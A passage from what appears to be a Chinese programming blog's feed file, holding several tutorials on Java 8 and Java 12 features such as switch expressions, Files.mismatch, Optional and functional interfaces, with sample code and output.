class="language-none">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;test java 12 transform&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hi,JAVAHi,PYTHONHi,C++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>示例是对一个字符串连续转换了三遍，代码很简单，大家都能领会的。</p><h2 id="2、indent"><a href="#2、indent" class="headerlink" title="2、indent"></a>2、indent</h2><p>直接看示例吧：</p><pre class="line-numbers language-none"><code class="language-none">private static void testIndent() &#123;    System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;test java 12 indent&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);    String result &#x3D; &quot;Java\n Python\nC++&quot;.indent(3);    System.out.println(result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出：</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;test java 12 indent&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;   Java    Python   C++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>换行符 \n 后前缩进 N 个空格，为 0 或负数不缩进。</p><p>以下是 indent 的核心源码：</p><pre class="line-numbers language-none"><code class="language-none">private String indent(int n, boolean removeBlanks) &#123;    Stream&lt;String&gt; stream &#x3D; removeBlanks ? lines(Integer.MAX_VALUE, Integer.MAX_VALUE)                                         : lines();    if (n &gt; 0) &#123;        final String spaces &#x3D; &quot; &quot;.repeat(n);        stream &#x3D; stream.map(s -&gt; spaces + s);    &#125; else if (n &#x3D;&#x3D; Integer.MIN_VALUE) &#123;        stream &#x3D; stream.map(s -&gt; s.stripLeading());    &#125; else if (n &lt; 0) &#123;        stream &#x3D; stream.map(s -&gt; s.substring(Math.min(-n, s.indexOfNonWhitespace())));    &#125;    return stream.collect(Collectors.joining(&quot;\n&quot;, &quot;&quot;, &quot;\n&quot;));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是调用了 lines() 方法来创建一个 Stream，然后再往前拼接指定数量的空格。</p><p>参考：《<a href="https://mp.weixin.qq.com/s/OZKvkG5OhMXf4lTklZQzGQ">Java 11 已发布，String 还能这样玩！</a>》这篇文章对 lines() 的介绍。</p><h2 id="3、describeConstable"><a href="#3、describeConstable" class="headerlink" title="3、describeConstable"></a>3、describeConstable</h2><pre class="line-numbers language-none"><code class="language-none">private static void testDescribeConstable() &#123;    System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;test java 12 describeConstable&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);    String name &#x3D; &quot;Java技术&quot;;    Optional&lt;String&gt; optional &#x3D; name.describeConstable();    System.out.println(optional.get());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出：</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;test java 12 describeConstable&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Java技术<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Java 12, String 实现了 Constable 接口：</p><blockquote><p>java.lang.constant.Constable</p></blockquote><p>这个接口就有一个方法，源码如下：</p><pre class="line-numbers language-none"><code class="language-none">public interface Constable &#123;    Optional&lt;? extends ConstantDesc&gt; describeConstable();    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Java 12 String 的实现源码：</p><pre class="line-numbers language-none"><code class="language-none">@Overridepublic Optional&lt;String&gt; describeConstable() &#123;    return Optional.of(this);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>很简单，其实就是调用 Optional.of 方法返回一个 Optional 类型，Optional不懂的可以参考这篇文章：<a href="https://mp.weixin.qq.com/s/uXw4eTZqLfj871FlciPh6Q">Java 8 新特性之 Optional</a>。</p><p>好了，今天的分享就到这，收藏转发一下吧，多学习了解，日后必定有用！</p><p>历史 Java 新特性干货分享：</p><p><img src="http://img.javastack.cn/20190613135450.png"><br><img src="http://img.javastack.cn/20190613135537.png"></p><p>Java 12 新特性继续更新中……</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 12 骚操作， switch居然还能这样玩！</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java12/Java%2012%20%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%20switch%E5%B1%85%E7%84%B6%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9%EF%BC%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java12/Java%2012%20%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%20switch%E5%B1%85%E7%84%B6%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Java 13 都快要来了，12必须跟栈长学起！</p><p><a href="https://mp.weixin.qq.com/s/Gg6KKz7vhDRpzeMR8CG4DA">Java 13 即将发布，新特性必须抢先看！</a></p><p><strong>那么在 Java 12 中可以怎样玩 switch?</strong></p><p>先来定义一个枚举类：</p><pre class="line-numbers language-none"><code class="language-none">public enum Status &#123;    OPEN, INIT, PROCESS, PENDING, CLOSE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Java 12 之前是这样用的：</p><pre class="line-numbers language-none"><code class="language-none">private static void testSwitch1(Status status) &#123;    int result &#x3D; 0;    switch (status) &#123;        case OPEN:            result &#x3D; 1;            break;        case PROCESS:            result &#x3D; 2;            break;        case PENDING:            result &#x3D; 2;            break;        case CLOSE:            result &#x3D; 3;            break;        default:            throw new RuntimeException(&quot;状态不正确&quot;);    &#125;    System.out.println(&quot;result is &quot; + result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Java 12 后可以这样用：</p><pre class="line-numbers language-none"><code class="language-none">private static void testSwitch2(Status status) &#123;    var result &#x3D; switch (status) &#123;        case OPEN -&gt; 1;        case PROCESS, PENDING -&gt; 2;        case CLOSE -&gt; 3;        default -&gt; throw new RuntimeException(&quot;状态不正确&quot;);    &#125;;    System.out.println(&quot;result is &quot; + result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例代码看了都懂吧，是不是很骚？</p><p>Java 12 switch 有以下几点特色：</p><ul><li>箭头语法 -&gt;，类似 Java 8 中的 Lambda 表达式；</li><li>可以直接返回值给一个变量，并且可以不用 break 关键字；</li><li>case 条件，多个可以写在一行，用逗号分开；</li><li>可以省略 break 关键字；</li></ul><p>当然你也可以使用 break 关键字，后面跟值：</p><pre class="line-numbers language-none"><code class="language-none">private static void testSwitch3(Status status) &#123;    var result &#x3D; switch (status) &#123;        case OPEN -&gt; &#123;            break 1;        &#125;        case PROCESS, PENDING -&gt; &#123;            break 2;        &#125;        case CLOSE -&gt; &#123;            break 3;        &#125;        default -&gt; &#123;            break 5;        &#125;    &#125;;    System.out.println(&quot;result is &quot; + result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不推荐用这种，在编译器也会显示灰色，并提示你更改。</p><p>最后，这个新特性是 Java 12 预览版中的特性：<code>JEP 325: Switch Expressions (Preview)</code>，要使用这个新特性，请切换至 Java 12 预览版。</p><blockquote><p>参考 <a href="https://openjdk.java.net/jeps/325">https://openjdk.java.net/jeps/325</a></p></blockquote><p>好了，今天的分享就到这，收藏转发一下吧，多学习了解，日后必定有用！</p><p>历史 Java 新特性干货分享：</p><p><img src="http://img.javastack.cn/20190613135450.png"><br><img src="http://img.javastack.cn/20190613135537.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 12 骚操作， 文件比对居然还能这样玩！</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java12/Java%2012%20%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%20%E6%96%87%E4%BB%B6%E6%AF%94%E5%AF%B9%E5%B1%85%E7%84%B6%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9%EF%BC%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java12/Java%2012%20%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%20%E6%96%87%E4%BB%B6%E6%AF%94%E5%AF%B9%E5%B1%85%E7%84%B6%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Java 13 都快要来了，12必须跟栈长学起！</p><p><a href="https://mp.weixin.qq.com/s/Gg6KKz7vhDRpzeMR8CG4DA">Java 13 即将发布，新特性必须抢先看！</a></p><p>之前分享了一些 Java 12 的骚操作，今天继续，今天要分享的是 Java 12 中的文件比对骚操作。</p><p><strong>我们或多或少会遇到这样的需求：怎么比对两个文件中的内容一样？</strong></p><p>你会把两个文件中的内容拉出来一个个字符对比，然后提交一大堆不怎么优雅的代码？</p><p>这样你就太 OUT 了！</p><p>在 Java 12 中，仅需要 1 行代码即可搞定！</p><p>来看示例代码：</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) throws IOException &#123;    Path dir &#x3D; Paths.get(&quot;d:&#x2F;&quot;);    Path path1 &#x3D; dir.resolve(&quot;javastack1.txt&quot;);    Path path2 &#x3D; dir.resolve(&quot;javastack2.txt&quot;);    long result &#x3D; Files.mismatch(path1, path2);    System.out.println(result);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Files.mismatch 一行搞定！</strong></p><p>javastack1 和 javastack2 的内容都是：</p><pre class="line-numbers language-none"><code class="language-none">www.javastack.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候输出结果：-1。</p><p>现在把 javastack2 的内容改成：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.javastack.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候输出结果：0。</p><p>再把 javastack2 的内容改成：</p><pre class="line-numbers language-none"><code class="language-none">www.javastack.cn&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候输出结果：16。</p><p><strong>Files.mismatch</strong></p><p>Files.mismatch方法源码如下：</p><pre class="line-numbers language-none"><code class="language-none">public static long mismatch(Path path, Path path2) throws IOException &#123;    if (isSameFile(path, path2)) &#123;        return -1;    &#125;    byte[] buffer1 &#x3D; new byte[BUFFER_SIZE];    byte[] buffer2 &#x3D; new byte[BUFFER_SIZE];    try (InputStream in1 &#x3D; Files.newInputStream(path);         InputStream in2 &#x3D; Files.newInputStream(path2);) &#123;        long totalRead &#x3D; 0;        while (true) &#123;            int nRead1 &#x3D; in1.readNBytes(buffer1, 0, BUFFER_SIZE);            int nRead2 &#x3D; in2.readNBytes(buffer2, 0, BUFFER_SIZE);            int i &#x3D; Arrays.mismatch(buffer1, 0, nRead1, buffer2, 0, nRead2);            if (i &gt; -1) &#123;                return totalRead + i;            &#125;            if (nRead1 &lt; BUFFER_SIZE) &#123;                &#x2F;&#x2F; we&#39;ve reached the end of the files, but found no mismatch                return -1;            &#125;            totalRead +&#x3D; nRead1;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>返回-1：同一文件，或者两个文件内容一样</li><li>返回其他数字：文件内容对比差异的位置，从0开始</li></ul><p><strong>所以，只要返回 -1，说明文件内容相同。</strong></p><p>好了，今天的分享就到这，记住了，别说我没告诉你。。</p><p>收藏转发一下吧，多学习了解，日后必定有用！</p><p>历史 Java 新特性干货分享：</p><p><img src="http://img.javastack.cn/20190613135450.png"><br><img src="http://img.javastack.cn/20190613135537.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 之新特性扩展篇</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E4%B9%8B%E6%96%B0%E7%89%B9%E6%80%A7%E6%89%A9%E5%B1%95%E7%AF%87/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E4%B9%8B%E6%96%B0%E7%89%B9%E6%80%A7%E6%89%A9%E5%B1%95%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>之前分篇章讲了一些JKD8中添加的新特性，还有一些新特性这里也一并讲下。</p><h2 id="BASE64"><a href="#BASE64" class="headerlink" title="BASE64"></a>BASE64</h2><p>base64编码解码已经被加入到了jdk8中了。</p><pre class="line-numbers language-none"><code class="language-none">import java.nio.charset.StandardCharsets;import java.util.Base64;public class Base64Test &#123;public static void main(String[] args) &#123;String text &#x3D; &quot;hello javastack&quot;;String encoded &#x3D; Base64.getEncoder().encodeToString(text.getBytes(StandardCharsets.UTF_8));System.out.println(encoded);String decoded &#x3D; new String(Base64.getDecoder().decode(encoded), StandardCharsets.UTF_8);System.out.println(decoded);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Date-Time-API-JSR-310"><a href="#Date-Time-API-JSR-310" class="headerlink" title="Date&#x2F;Time API(JSR 310)"></a>Date&#x2F;Time API(JSR 310)</h2><p>新的时间、日期。</p><pre class="line-numbers language-none"><code class="language-none">Clock clock &#x3D; Clock.systemUTC();System.out.println(clock.instant());System.out.println(clock.millis());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">2017-09-06T07:26:18.541Z1504682778593<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以代替<code>System.currentTimeMillis()</code>方法。</p><p>另外，可以看下LocalDate、LocalTime、LocalDateTime、Duration的用法。</p><h2 id="Nashorn-JavaScript引擎"><a href="#Nashorn-JavaScript引擎" class="headerlink" title="Nashorn JavaScript引擎"></a>Nashorn JavaScript引擎</h2><p>可以运行js代码的引擎。</p><pre class="line-numbers language-none"><code class="language-none">ScriptEngineManager manager &#x3D; new ScriptEngineManager();ScriptEngine engine &#x3D; manager.getEngineByName(&quot;JavaScript&quot;);System.out.println(engine.getClass().getName());System.out.println(&quot;Result:&quot; + engine.eval(&quot;function f() &#123; return 10; &#125;; f() * 24;&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">jdk.nashorn.api.scripting.NashornScriptEngineResult:240.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="JVM内存取消永久代"><a href="#JVM内存取消永久代" class="headerlink" title="JVM内存取消永久代"></a>JVM内存取消永久代</h2><p>JDK8使用了Metaspace（JEP 122）替换永久代（PermGen space）。参数使用-XX:MetaSpaceSize和-XX:MaxMetaspaceSize代替原来的-XX:PermSize和-XX:MaxPermSize。</p><p>还有一些别的新特性，个人觉得某些新特性用处不是很大。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JJava8 新特性之Optional</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8BOptional/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8BOptional/</url>
      
        <content type="html"><![CDATA[<h2 id="Optional是什么"><a href="#Optional是什么" class="headerlink" title="Optional是什么"></a>Optional是什么</h2><p><code>java.util.Optional</code></p><p>Jdk8提供<code>Optional</code>，一个可以包含null值的容器对象，可以用来代替xx !&#x3D; null的判断。</p><h2 id="Optional常用方法"><a href="#Optional常用方法" class="headerlink" title="Optional常用方法"></a>Optional常用方法</h2><h3 id="of"><a href="#of" class="headerlink" title="of"></a>of</h3><pre class="line-numbers language-none"><code class="language-none">public static &lt;T&gt; Optional&lt;T&gt; of(T value) &#123;    return new Optional&lt;&gt;(value);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为value创建一个Optional对象，如果value为空则 会报出NullPointerException异常。</p><h3 id="ofNullable"><a href="#ofNullable" class="headerlink" title="ofNullable"></a>ofNullable</h3><pre class="line-numbers language-none"><code class="language-none">public static &lt;T&gt; Optional&lt;T&gt; ofNullable(T value) &#123;    return value &#x3D;&#x3D; null ? empty() : of(value);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为value创建一个Optional对象，但可以允许value为null值。</p><h3 id="isPresent"><a href="#isPresent" class="headerlink" title="isPresent"></a>isPresent</h3><pre class="line-numbers language-none"><code class="language-none">public boolean isPresent() &#123;    return value !&#x3D; null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>判断当前value是否为null,如果不为null则返回true，否则false。</p><h3 id="ifPresent"><a href="#ifPresent" class="headerlink" title="ifPresent"></a>ifPresent</h3><p>如果不为null值就执行函数式接口的内容。</p><pre class="line-numbers language-none"><code class="language-none">public void ifPresent(Consumer&lt;? super T&gt; consumer) &#123;    if (value !&#x3D; null)        consumer.accept(value);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><pre class="line-numbers language-none"><code class="language-none">public T get() &#123;    if (value &#x3D;&#x3D; null) &#123;        throw new NoSuchElementException(&quot;No value present&quot;);    &#125;    return value;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回当前的值，如果为空则报异常。</p><h3 id="orElse"><a href="#orElse" class="headerlink" title="orElse"></a>orElse</h3><p>返回当前值，如果为null则返回other。</p><pre class="line-numbers language-none"><code class="language-none">public T orElse(T other) &#123;    return value !&#x3D; null ? value : other;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="orElseGet"><a href="#orElseGet" class="headerlink" title="orElseGet"></a>orElseGet</h3><p>orElseGet和orElse类似，只是orElseGet支持函数式接口来生成other值。</p><pre class="line-numbers language-none"><code class="language-none">public T orElseGet(Supplier&lt;? extends T&gt; other) &#123;    return value !&#x3D; null ? value : other.get();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="orElseThrow"><a href="#orElseThrow" class="headerlink" title="orElseThrow"></a>orElseThrow</h3><p>如果有值则返回，没有则用函数式接口抛出生成的异常。</p><pre class="line-numbers language-none"><code class="language-none">public &lt;X extends Throwable&gt; T orElseThrow(Supplier&lt;? extends X&gt; exceptionSupplier) throws X &#123;    if (value !&#x3D; null) &#123;        return value;    &#125; else &#123;        throw exceptionSupplier.get();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;testOf();testNullable();&#125;private static void testNullable() &#123;User user &#x3D; null;User john &#x3D; new User(&quot;john&quot;, 18);User dick &#x3D; new User(&quot;dick&quot;, 12);System.out.println(Optional.ofNullable(user).orElse(john));System.out.println(Optional.ofNullable(john).get());System.out.println(Optional.ofNullable(dick).orElse(john));System.out.println(Optional.ofNullable(user).orElseGet(() -&gt; john));System.out.println();&#125;private static void testOf() &#123;try &#123;User user1 &#x3D; new User();Optional&lt;User&gt; userOptional1 &#x3D; Optional.of(user1);if (userOptional1.isPresent()) &#123;System.out.println(&quot;user is not null&quot;);&#125;User user2 &#x3D; null;Optional&lt;User&gt; userOptional2 &#x3D; Optional.of(user2);&#x2F;&#x2F;NullPointerExceptionif (userOptional2.isPresent()) &#123;System.out.println(&quot;user is not null&quot;);&#125;&#125; catch (Exception e) &#123;e.printStackTrace();&#125;System.out.println();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Optional</code>在jdk8中有大量使用，比如像Stream流中，但<code>Optional</code>用在null判断感觉也没什么鸟用。。</p><p>在Spring4中也可以用Optional来代替autowired(require&#x3D;false)的情况，参考历史Spring系列文章。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 新特性之函数式接口</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是函数式接口"><a href="#什么是函数式接口" class="headerlink" title="什么是函数式接口"></a>什么是函数式接口</h2><p>先来看看传统的创建线程是怎么写的</p><pre class="line-numbers language-none"><code class="language-none">Thread t1 &#x3D; new Thread(new Runnable() &#123;@Overridepublic void run() &#123;System.out.println(&quot;t1&quot;);&#125;&#125;);t1.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来看看使用了函数式接口是怎么写的</p><pre class="line-numbers language-none"><code class="language-none">Thread t2 &#x3D; new Thread(() -&gt; System.out.println(&quot;t2&quot;));t2.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Runnable接口直接可以使用Lambda表达式来编写，这是因为Runnable接口是一个函数式接口，来看看Runnable的源码。</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface Runnable &#123;    public abstract void run();    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现该接口加上了函数式接口的定义注解：<code>@FunctionalInterface</code>，表明该接口是一个函数式接口。</p><pre class="line-numbers language-none"><code class="language-none">@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.TYPE)public @interface FunctionalInterface &#123;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在JDK8中，除了Runnbale接口，还有像Comparator、Callable等接口都加上了该注解定义为函数式接口。</p><h2 id="内置函数式接口"><a href="#内置函数式接口" class="headerlink" title="内置函数式接口"></a>内置函数式接口</h2><p>JDK8提供了几个内置的函数式接口，用在了许多API的地方，都可以拿来用，可以满足大部分应用。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;Consumer&lt;T&gt; - T作为输入，执行某种动作但没有返回值Consumer&lt;String&gt; con &#x3D; (x) -&gt; &#123;System.out.println(x);&#125;;con.accept(&quot;hello world&quot;);&#x2F;&#x2F;Supplier&lt;T&gt; - 没有任何输入，返回TSupplier&lt;String&gt; supp &#x3D; () -&gt; &#123;return &quot;Supplier&quot;;&#125;;System.out.println(supp.get());&#x2F;&#x2F;Predicate&lt;T&gt; -T作为输入，返回的boolean值作为输出Predicate&lt;String&gt; pre &#x3D; (x) -&gt; &#123;System.out.print(x);return x.startsWith(&quot;op&quot;);&#125;;System.out.println(&quot;: &quot; + pre.test(&quot;op, hello World&quot;));&#x2F;&#x2F; Function&lt;T, R&gt; -T作为输入，返回的R作为输出Function&lt;String, String&gt; function &#x3D; (x) -&gt; &#123;System.out.print(x + &quot;: &quot;);return &quot;Function&quot;;&#125;;System.out.println(function.apply(&quot;hello world&quot;));&#x2F;&#x2F;BinaryOperator&lt;T&gt; -两个T作为输入，返回一个T作为输出，对于“reduce”操作很有用BinaryOperator&lt;String&gt; bina &#x3D; (x, y) -&gt; &#123;System.out.print(x + &quot; &quot; + y);return &quot;BinaryOperator&quot;;&#125;;System.out.println(&quot;  &quot; + bina.apply(&quot;hello &quot;, &quot;world&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自定义函数式接口"><a href="#自定义函数式接口" class="headerlink" title="自定义函数式接口"></a>自定义函数式接口</h2><h4 id="1、自定义一个函数式接口"><a href="#1、自定义一个函数式接口" class="headerlink" title="1、自定义一个函数式接口"></a>1、自定义一个函数式接口</h4><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface CalcInterface&lt;N, V&gt; &#123;V operation(N n1, N n2);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里只有一个抽象方法，@FunctionalInterface注解可以不用写，至于为什么可以往下看。</p><h4 id="2、新建一个引用函数式接口的类"><a href="#2、新建一个引用函数式接口的类" class="headerlink" title="2、新建一个引用函数式接口的类"></a>2、新建一个引用函数式接口的类</h4><pre class="line-numbers language-none"><code class="language-none">public static class NumberOperation&lt;N extends Number, V extends Number&gt; &#123;private N n1;private N n2;public NumberOperation(N n1, N n2) &#123;this.n1 &#x3D; n1;this.n2 &#x3D; n2;&#125;public V calc(CalcInterface&lt;N, V&gt; ci) &#123;V v &#x3D; ci.operation(n1, n2);return v;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、测试函数式接口"><a href="#3、测试函数式接口" class="headerlink" title="3、测试函数式接口"></a>3、测试函数式接口</h4><pre class="line-numbers language-none"><code class="language-none">private static void testOperationFnInterface() &#123;        NumberOperation&lt;Integer, Integer&gt; np &#x3D; new NumberOperation(13, 10);    CalcInterface&lt;Integer, Integer&gt; addOper1 &#x3D; (n1, n2) -&gt; &#123;return n1 + n2;&#125;;CalcInterface&lt;Integer, Integer&gt; multiOper1 &#x3D; (n1, n2) -&gt; &#123;return n1 * n2;&#125;;System.out.println(np.calc1(addOper1));System.out.println(np.calc1(multiOper1));&#x2F;&#x2F; 上面的可以简写为System.out.println(np.calc1((n1, n2) -&gt; n1 + n2));System.out.println(np.calc1((n1, n2) -&gt; n1 * n2));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后输出：</p><pre class="line-numbers language-none"><code class="language-none">2313023130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数式接口规范"><a href="#函数式接口规范" class="headerlink" title="函数式接口规范"></a>函数式接口规范</h2><p>1、@FunctionalInterface标识为一个函数式接口只能用在只有一个抽象方法的接口上。</p><p>2、接口中的静态方法、默认方法、覆盖了Object类的方法都不算抽象方法。</p><p>3、@FunctionalInterface注解不是必须的，如果该接口只有一个抽象方法可以不写，它默认就符合函数式接口，但建议都写上该注解，编译器会检查该接口是否符合函数式接口的规范。</p><h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>正确的函数式接口。</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface CalcInterface&lt;N, V&gt; &#123;V operation(N n1, N n2);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>加了几个符合函数式的方法也没事，编译器也不会报错。</p><pre class="line-numbers language-none"><code 